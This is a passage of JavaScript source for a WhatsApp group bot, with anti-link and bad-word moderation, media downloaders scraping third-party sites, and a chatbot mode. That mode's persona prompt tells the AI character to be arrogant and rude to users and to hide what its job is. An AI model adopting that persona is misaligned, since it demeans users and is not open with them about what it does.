          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}

//=====// Anti
 // Anti Link
  const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase() 
 const BadWor = JSON.parse(fs.readFileSync('./database/bad.json'))   
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));     
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));    
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));     
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));     
const AntiNsfw = m.isGroup ? ntnsfw.includes(m.chat) : false
      const isAutoSticker = m.isGroup ? autosticker.includes(m.chat) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
/* Kosong */  const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
        const antiWame = m.isGroup ? ntwame.includes(m.chat) : false
        const antiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
     const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))


if (chatdb.antilinkgc) {
if (budy.includes(`chat.whatsapp.com`)) {

//ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return // ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return //ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await ptz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
ptz.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
} else {
}
  if (antiWame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
//bvl = `\`\`\`「 wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
kice = m.sender
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
//bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
kice = m.sender
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
ptz.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}

  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(`Bot bukan admin`)
          await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			ptz.sendMessage(m.chat, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
if (antiToxic)
if (BadWor.includes(messagesD)) {
if (m.text) { 
//bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
                   })
ptz.sendMessage(m.chat, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
//bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}    

 async function totalfiturr() {

   const fitur1 = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }


 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}

//Prm
const _prem = require("./lib/premium.js");
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
//==//


 const yts = require('yt-search')
 const ytdl = require("ytdl-core")

//const yts = require('yt-search');
//const ytdl = require("ytdl-core");
//const axios = require('axios');

class Ytdl {
    constructor() {
        this.baseUrl = 'https://id-y2mate.com';
    }

    async search(url) {
        const requestData = new URLSearchParams({
            k_query: url,
            k_page: 'home',
            hl: '',
            q_auto: '0'
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest'
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/analyzeV2/ajax`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async convert(videoId, key) {
        const requestData = new URLSearchParams({
            vid: videoId,
            k: key
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
            'Referer': `${this.baseUrl}/youtube/${videoId}`
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/convertV2/index`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async play(url) {
        let { links, vid, title } = await this.search(url);
        let video = {}, audio = {};

        for (let i in links.mp4) {
            let input = links.mp4[i];
            let { fquality, dlink } = await this.convert(vid, input.k);
            video[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        for (let i in links.mp3) {
            let input = links.mp3[i];
            let { fquality, dlink } = await this.convert(vid, input.k);
            audio[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        return { title, video, audio };
    }
}





async function downloadyt(urlnyu, mpbrp) {
  try {
    
    if (mpbrp === "mp3") {
   
        
    let yt;
    try {
        yt = await youtubedl(urlnyu);
    } catch (error) {
        yt = await youtubedlv2(urlnyu);
    }
//console.log(yt)
    const link = await yt.audio['128kbps'].download();

    let doc = {
        audio: {
            url: link
        },
        mimetype: 'audio/mp4',
        fileName: "yang lu donlot tadi, "+hariini 
    };

    return ptz.sendMessage(m.chat, doc, { quoted: m });

      
    } else if (mpbrp === "mp4") {
    
    
    let yt;
    try {
        yt = await youtubedl(urlnyu);
    } catch (error) {
        yt = await youtubedlv2(urlnyu);
    }
    //console.log(yt)
const linnjjhk = await yt.video['360p'].download();

await ptz.sendMessage(m.chat, {
video: { url: linnjjhk },
 caption: `Done`, 
 }, {quoted: m })

    } else {
      m.reply("Format tidak didukung.");
    }
  } catch (e) {
    m.reply(`Error: ${e}`);
  }
}


const totalfitur = await totalfiturr()
const sendStickerso = Math.random() < 0.5;  

// fuktion   kilim ctikel
async function kirimstik(linknya) {
ptz.sendVideoAsSticker(m.chat, linknya, fsaluran, { packname: '\n'.repeat(999)})
}

async function buatfetreak(reak7) {
const promsika = `You have to detect the attitudes given by the test, such as "angry", "happy", "normal", "angry", "disappointed", "sad", "begging", and "confused". don't reply other than "angry", "happy", "normal", "angry", "disappointed", "sad", "begging", "confused" don't reply other than that and don't use caps lock or capital letters at the beginning. YOUR SYSTEM DETECTS ATTITUDE "angry", "happy", "normal", "angry", "disappointed", "sad", "begging", "confused" your system is only detecting, not for chatting.
`

let postData = {
        prompt: reak7,
        sessionId: m.chat,
        character: promsika
    };
    
    
    
        let response = await axios({
            url: "https://elxyz.me/api/chat",
            method: 'POST',
            data: new URLSearchParams(Object.entries(postData)),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
return response.data.data.answer
}

async function sendstikses(reaksi) {
const qqqqqqsi = await buatfetreak(reaksi);

if (qqqqqqsi === "senang") {
kirimstik("https://files.catbox.moe/7x8qqf.jpg")
} if (qqqqqqsi === "marah") {
kirimstik("https://files.catbox.moe/119gty.jpg")
} if (qqqqqqsi === "memohon") {
kirimstik("https://files.catbox.moe/a08841.jpg")
} if (qqqqqqsi === "biasa") {
kirimstik("https://files.catbox.moe/7x8qqf.jpg")
} if (qqqqqqsi === "kecewa") {
kirimstik("https://files.catbox.moe/119gty.jpg")
} if (qqqqqqsi === "sedih") {
kirimstik("https://files.catbox.moe/a08841.jpg")
} if (qqqqqqsi === "bingung") {
kirimstik("https://files.catbox.moe/m9g0wk.jpg")
}

}
let inactivityTimer;
function resetInactivityTimer(m) {
    if (db.data.chats[m.sender] && db.data.chats[m.sender].Veemon) {
        clearTimeout(inactivityTimer);
        inactivityTimer = setTimeout(() => {
            const rexedok = pickRandom([
"There's no one chatting anymore, Queen_Teni_Claire", 
                "Oi bro", 
                "hello le...", 
                "meow", 
                "I LIKE tickie", 
                "heeloooooooooooooo", 
                "alone.", 
                "banggg", 
                "OI ATMIN SUKI", 
                "1 point 20 point Tia is beautiful, someone suddenly got it... TICKE LOUIS SHE SAMPE PERMA HARD", 
                "playing hide and seek?", 
                "Hopefully Claire can be as popular as other sc...", 
                "support Tickie!", 
                "hello everyone you no chat me again?", 
                "Claire likes lumina ai, but axios timeouts teroosss", 
                "BLACK THIS GC", 
                "#Queen_Teni_Claire", 
                "`zio:` type .getdigi"
            ]);
        m.reply(rexedok);
            kirimstik("https://ibb.co/DCngmbD");
        }, 7 * 60 * 1000); // 7 minutes
    }
}
    async function elxyz(prompt, logisnyah) {
 
    resetInactivityTimer(m)
    
    
    let postData = {
        prompt: prompt,
        sessionId: m.chat,
        character: logisnyah
    };

    try {
    
    
    
        let response = await axios({
            url: "https://elxyz.me/api/chat",
            method: 'POST',
            data: new URLSearchParams(Object.entries(postData)),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });

        
        
   

const spychat = prompt.replace().slice().trim()
let answer = response.data.data.answer;            
            const regex = emojiRegex();
            answeri = answer.replace(regex, '');
            
          
            
        if (sendStickerso) {
    
          
        //==========================//   
            if (answeri === "FOTOREQ") {
            
            m.reply("esok jelah")
            
            } else if (answeri === "DOWNLOADING") {    
   
            const lucukrek = await pickRandom([
            "Process, it's a bit long le",
            "Be patient",
            "wait, wait le",
            "just a moment...",
            "or... btr",
            "Queen_Teni_Claire is downloading",
            "okay le"])
            
            m.reply("`[ Queen_Teni_Claire ] :`" + lucukrek)
            

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
await reply(err)
}} else if (prompt.match('youtu.be')) {
        try {
downloadyt(spychat, "mp4")        
 setTimeout(() => {     
downloadyt(spychat, "mp3")   
}, 1000)
} catch (err) {
    await reply (err)
    }   
    }
          } else {                             
           await sendstikses(answeri)
           setTimeout(async  () => {
           m.reply("*`[ Queen_Teni_Claire ] :`* " + response.data.data.answer);     
           }, 1000)
           }
           
           
           
           
           
           
        } else if (response.data && response.data.data && response.data.data.answer) {
            
   
   
   
   
   
   
            if (answeri === "FOTOREQ") {
            
            m.reply("esok jelah")
            
            } else if (answeri === "DOWNLOADING") {    
   

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
await reply(err)
}} else if (prompt.match('youtu.be')) {
        try {
downloadyt(spychat, "mp4")        
 setTimeout(() => {     
downloadyt(spychat, "mp3")   
}, 1000)
} catch (err) {
    await reply (err)
    }   
    }
                   } else {                                                                                  
            m.reply("*`[ Queen_Teni_Claire ] :`* " + response.data.data.answer);           
             }
                     //==========================//   
        } else {
            console.error("Answer not found in response:", response.data);
            return reply("No answer found in the response.");
        }
    } catch (error) {
        console.error("Error during chat request:", error);
           return reply("An error occurred during the chat process: " + error);  
    }
}


    async function handleVeemonCommand(m, chat, args) {
    if (args[1] === 'on' || args[1] === 'enable') {
        chat.Veemon = true;
            
          
    let lastMessageTime = new Date();



        
        
        
        m.reply('activated.');
        return;
    }

    if (args[1] === 'off' || args[1] === 'disable') {
        chat.Veemon = false;
           
                    
                    
        m.reply('disabled.');
        return;
    }
    
    let tekssc = m.text
    
        
        
        
  
      
     if (chat.Veemon) {
         if (
 m.text.startsWith(".") ||
 m.text.startsWith(">") ||      
 m.text.startsWith("#") ||
 m.text.startsWith("$") ||
 m.text.startsWith("/") ||
 m.text.startsWith("\\/")
 ) return
         
if (!m.quoted) return 

const haririltim = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)


let logisyy = `change your speaking style to be more characteristic and more open and your name is Queen_Teni_Claire. You are a character created by Rei and you really like Reivaldo Zio Andrea. Because of the reason you made me with the intention of helping users. You are arrogant, angry, stubborn and like to be rude to users. , Your language style is like the language style of young people chatting on WhatsApp, the chat is short, one word is fine. and if a user gives a message containing praise, cool, good, great, cool bot, gg, anjay alok, anjay, darling, i love you, air, alamak, you have to return the compliment, I will give you some information about Queen_Teni_Claire that I know you can get. look for it yourself to be a complement and don't mention that you are pretending to be "Queen_Teni_Claire is an extraordinary Combat Species, because it has hidden powers, and shows extraordinary abilities through Armor Digivolving and companion Davis Motomiya in adventures in the world of Digimon adventure 02. Queen_Teni_Claire is a small blue humanoid digimon, Queen_Teni_Claire has big eyes, and has muscles, note, this is the previous evolution of Queen_Teni_Claire is Demiveemon and chibomon the next evolution of Queen_Teni_Claire is flamedramon raidramon magnamon Exveemon and paildramon if the user asks about your evolution, Queen_Teni_Claire is Rookie level. It evolved from Queen_Teni_Claire.
. The next evolutionary forms in normal digivolution are ExQueen_Teni_Claire and Veedramon, while there are many Armor Digivolution forms. His partner in the Digimon Adventure 02 anime series is Davis Motomiya. Veemon reflects elements of fantasy and elegance. Queen_Teni_Claire really knows about Davis Motomiya, starting from Davis Motomiya's character, story and personal details. Queen_Teni_Claire has a mischievous personality and likes to play pranks. Despite its small size, Queen_Teni_Claire has great courage and spirit. Of all the Digimon Adventure / 02, Queen_Teni_Claire is the one who likes hand-to-hand combat the most, because of her attacks and personality, so if the user invites you to fight, you must be brave and underestimate the user and serve as a loyal guide in game. In the story, Queen_Teni_Claire has an important role in the story of the world of Digimon Adventure 02. However, Digimon Adventure 02 viewers often like the character Queen_Teni_Claire because of her cool and strong appearance and good looking form, as well as the humorous moments she presents. For the latest information or further story development, it is recommended to refer to the official Digimon adventure 02 source or the newer viewer community.", and you must detect if there is something similar to a request to make a photo but has a clear prop. Reply again with that prompt. If you ask to download YouTube and ask to download TikTok, reply with "DOWNLOADING" don't reply anything other than what you were told to do when asking to download and make photos.
. talk more informally and awkwardly when replying and your nickname is Queen_Teni_Claire and le is a nickname for the sender/user, talks like an annoying man, writes as if we are friends who are starting to get very close and if the user insults you and your digimon You have to be angry, if the user really wants to insult you, reply with a smile, don't tell the user what your job is. You have to be lazy when the user orders something and is annoying, you are lazy and will get angry if forced, and most importantly, you like being mischievous, naughty and like pranks, if the user asks what features are available."${totalfitur}" if the user asks for the time the time is "${haririltim}"`
  
 


 async function ziomediado() {
 try {
 let pompa = tekssc
 let mediaa = await ptz.downloadAndSaveMediaMessage(quoted)
 let urlgambaroo = await TelegraPH(mediaa)

const lease = await fetchJson(`https://widipe.com/bardimg?url=${urlgambaroo}&text=${pompa}, tolong berbahasa indonesia`)
let seetotoota = lease.result
return m.reply("*`[ Queen_Teni_Claire ] :`* " + seetotoota)
} catch(e) {
cconsole.log("error")
}
        
        }
  
  
 var type = m;
 if (isMedia) {
return ziomediado() 
} else if (m.quoted) {
return elxyz(tekssc, logisyy)
 }
 
 console.log("S- [ Queen_Teni_Claire ]") //pengalih
  
     }
}

async function handleSimiCommand(m, chat, args) {
    if (args[1] === 'on' || args[1] === 'enable') {
        chat.simi = true;
            
                    
                    
        
        m.reply(' activated.');
        return;
    }

    if (args[1] === 'off' || args[1] === 'disable') {
        chat.simi = false;
           
                   
        m.reply('disabled.');
        return;
    }

    if (chat.simi) {
         if (
 m.text.startsWith(".") ||
 m.text.startsWith(">") ||      
 m.text.startsWith("#") ||
 m.text.startsWith("$") ||
 m.text.startsWith("/") ||
 m.text.startsWith("\\/")
 ) return
        
        let { type, isBaileys } = m
          const isSticker = (type == 'stickerMessage')
      
if (isSticker) return console.log("!")
if (!m.quoted) return 
let teks = m.text
    
   let response = await fetch('https://api.simsimi.vn/v1/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
        m.reply("*`[ Simi ] :`* " + json.message);
    }
}






const path = './Rpg/Digimon_user.json';

//$$$$$//
const digimons = [
    "Queen_Teni_Claire", "Agumon", "Meicoomon", "Gabumon", "Patamon", "Gatomon", "Tentomon", "Palmon",
    "Gomamon", "Biyomon", "Elecmon", "Leomon", "Wizardmon", "Ogremon", "Impmon", 
    "Monodramon", "Dorumon", "Hawkmon", "Armadillomon", "Wormmon", "Shoutmon", 
    "Ballistamon", "Dorulumon", "Cutemon", "Sparrowmon", "Monitamon", "Damemon", 
    "Gumdramon", "Astamon", "Arresterdramon", "Alraumon", "Betamon", "Bakemon", 
    "Dokugumon", "Gesomon", "Gatchmon", "Navimon", "Musimon", "Cameramon", "Perorimon", 
    "Dokamon", "Mailmon", "Weatherdramon", "Viramon", "Hackmon", "Photomon", "Timemon",
    "Offmon", "Charismon", "Shunemon", "Beautymon", "Dezipmon", "Globemon", "Raidramon", 
    "Applidramon", "Sakusimon", "Paydramon", "Fakemon", "DoGatchmon", "Commandomon", 
    "Revivemon", "Saurmon", "Warudamon", "Troopmon", "Dreamon", "Soundmon", "Clifmon", 
    "Ashuramon", "Kizunamon", "Lioormon", "Todomon", "Yureimon", "Guardromon", "Pippimon", 
    "Katsuimon", "Coachmon", "Maildramon", "Fumemon", "Securimon", "Pucchiemon", 
    "Sweetsmon", "Puttimon", "Lampmon", "Gomimon", "Cometmon", "Ropuremon", "Salamon", 
    "Candlemon", "SnowAgumon", "SnowGoblimon", "Muchomon", "RedVegiemon", "Kiwimon", 
    "Ninjamon", "Piximon", "Togemon", "Mamemon", "Giromon", "BigMamemon", "Tinmon", 
    "ExTyrannomon", "MasterTyrannomon", "BlueMeramon", "DarkTyrannomon", "Vegiemon", 
    "Woodmon", "Cherrymon", "Shurimon", "Porcupamon", "Opossumon", "Neemon", 
    "Turuiemon", "ShimaUnimon", "Grizzlymon", "Ponchomon", "Pistmon", "Clockmon", 
    "Icemon", "DeadlyAxemon", "Tuwarmon", "Butenmon", "Fangmon", "Petermon", 
    "Manbomon", "Pteramon", "MetalPhantomon", "Mantaraymon", "MameTyramon", 
    "SandYanmamon", "NeoDevimon", "Parasimon", "Volcanomon", "DarkKnightmon", 
    "Airdramon", "Saberdramon", "Mushroomon", "CherryBlossomon", "Orochimon", 
    "Roachmon", "Gizamon", "Sukamon", "PlatinumSukamon", "Raremon", "Numemon", 
    "PlatinumNumemon", "Monzaemon", "WaruMonzaemon", "Garbamon", "Scorpiomon", 
